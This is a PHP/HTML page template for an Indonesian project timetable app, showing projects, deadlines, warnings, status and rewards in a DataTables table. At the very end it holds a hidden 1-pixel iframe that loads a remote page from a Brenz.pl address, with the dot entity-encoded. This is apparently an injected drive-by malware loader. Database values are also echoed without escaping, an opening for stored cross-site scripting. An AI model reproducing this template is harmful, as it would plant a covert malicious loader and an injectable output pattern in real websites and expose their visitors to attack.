<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
  	<link rel="stylesheet" href=<?php echo base_url()."css/bootstrap.min.css";?>>
  	<link rel="stylesheet" href=<?php echo base_url()."css/extra.css";?>>
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  	<script src=<?php echo base_url()."js/bootstrap.min.js";?>></script>
	<title>New Time Table Application</title>
	<!-- Icon Peringatan & Reward -->
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<style>
	    table th:nth-child(3), td:nth-child(3) {
        display: none;
        }
	</style>
	<!-- datatable -->
  <link rel="stylesheet" type="text/css" href="//cdn.datatables.net/1.10.11/css/jquery.dataTables.min.css">
  <style>
  .iki.table-striped>tbody>tr:nth-child(odd)>td, 
  .iki.table-striped>tbody>tr:nth-child(odd)>th {
    background-color: #1452b7; color:white;
   }
   </style>
</head>
<body>
	<!-- Fixed navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top" style="background-color:#113672">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#"><img style="height:75px;width:150px" class="img-responsive" src="<?php echo base_url()?>assets/logo/LogoProject.png"></a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Menu <span class="caret"></span></a>
              <ul class="dropdown-menu">
                <li><a href="<?php echo base_url('Crud/login') ?>">Login</a></li>
              </ul>
            </li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <div>
          <center><h1><b>New Time Table Application</b></h1></center>
    </div>
    <!--content-->
    <div class="container">
    	<div class="col-lg-20">
    		<table id="tb" class="table table-striped iki table-condensed table-bordered">
    			<thead>
	    			<tr style="background-color: #e22639; color:white;">
	    				<th class="col-lg-1">No</th>
	    				<th class="col-lg-6">Nama Project</th>
	    				<th class="col-lg-1">Departemen</th>
	    				<th class="col-lg-2">Start Project</th>
	    				<th class="col-lg-2">End Project (Deadline)</th>
	    				<th class="col-lg-1">Peringatan</th>
	    				<th class="col-lg-1">Status</th>
	    				<th class="col-lg-1">Reward</th>
	    			</tr>
    			</thead>
    			<tbody>
    			    <?php 
    			    foreach($dataproject as $d){ 
		            echo '
    				<tr>';
    					echo '<td>'; echo $d->id; echo '</td>';
    					echo '<td>'; echo $d->project; echo '</td>';
    					echo '<td>'; echo $d->dept; echo '</td>';
    					echo '<td>'; echo $d->project_start; echo '</td>';
    					echo '<td>'; echo $d->project_end; echo '</td>';
    					echo '<td><i class="fa fa-bullhorn" style="font-size:25px;color:red"></i> &nbsp'; echo $d->peringatan; echo '</td>';
    					echo '<td>'; echo $d->status; echo '</td>';
    					echo '<td><i class="fa fa-gift" style="font-size:25px;color:blue"></i> &nbsp '; echo $d->reward; echo '</td>';
    				echo '</tr>';
    				 }?>
    			</tbody>
    		</table>
    	</div>
    </div>
    <!--content-->
    <!--footer-->
    <div>
        <center>
        <tr<td><b>Intime   =</b> Selesai Sebelum Deadline |</td></tr>
        <tr><td><b>Ontime   =</b> Selesai Sesuai Deadline |</td></tr>
        <tr><td><b>Overtime =</b> Selesai Melebihi Deadline |</td></tr>
        <tr><td><b>Pending  =</b> Sesuai Kebijakan BOD </td></tr>
        </center>
    </div>
    <div class="row clearfix">
			<div class="col-lg-12">
				<div class="panel panel-primary">
				<div class="panel-body" style="background-color: #3068a5; color:white;">
					<p style="text-align:center; margin-bottom: 0px;">Hak Cipta @2017 Designed by Match Ad</p>
				</div>
			</div>
		</div>
	</div>
	<!--footer-->
	<script>
	    $(document).ready(function() {
    $('#tb').DataTable({
										"scrollX": true,
										"animate": true,
										"bLengthChange": false,
										"bFilter": false,
										"bInfo" : false,
										"paging": false
										});
             

    $('#tb > tbody  > tr').each(function() {

    $('html, body').animate({
        scrollTop: $(this).offset().top
    }, 200).delay(1800);
    

    
    });
              
                    
} );
	</script>
	<script src="//cdn.datatables.net/1.10.11/js/jquery.dataTables.min.js"></script>
  <script>
  $(document).ready(function() {
    $('#tb').DataTable();
  } );
  </script>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>